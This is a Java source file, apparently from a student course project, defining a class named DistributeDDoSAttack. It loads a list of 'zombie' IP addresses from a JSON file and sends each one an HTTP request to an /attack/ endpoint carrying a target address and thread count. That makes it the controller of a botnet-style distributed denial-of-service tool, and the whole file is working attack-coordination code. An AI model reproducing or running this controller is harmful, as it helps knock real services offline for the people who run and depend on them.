package edu.csupomona.cs480.data;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;

import org.json.JSONException;

public class DistributeDDoSAttack {

	private static final String BASE_DIR = System.getProperty("user.home") + "/ip";
    public ArrayList<String> ipArray = new ArrayList<String>();
    
    public String targetAddress;
    public String numThreadsUsedToAttack;
	
    public DistributeDDoSAttack(String addr, String num)
    {
    	targetAddress = addr;
    	numThreadsUsedToAttack = num;    	
    }
    
    public void start() {
    	
		String filePath = BASE_DIR + "/" + "ip-map.json";

    	IPServerJSONReader ipRead = new IPServerJSONReader();
  	  
  		try {
			ipArray = ipRead.getIPFromFile(filePath);
		} catch (IOException | JSONException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
  
  		for(String zombieIP : ipArray) {	
  			URL url = null;
			try {
				url = new URL("http://" + zombieIP + ":8080/attack/?targetAddress=" 
						+ targetAddress + "&numberOfThreads=" + numThreadsUsedToAttack);
			} catch (MalformedURLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
  			
  			new DistributeThread(url).start();
  		}
  		
  		System.out.println("Trigger Distributed to " + ipArray.size() + " Zombies");
    }	
}
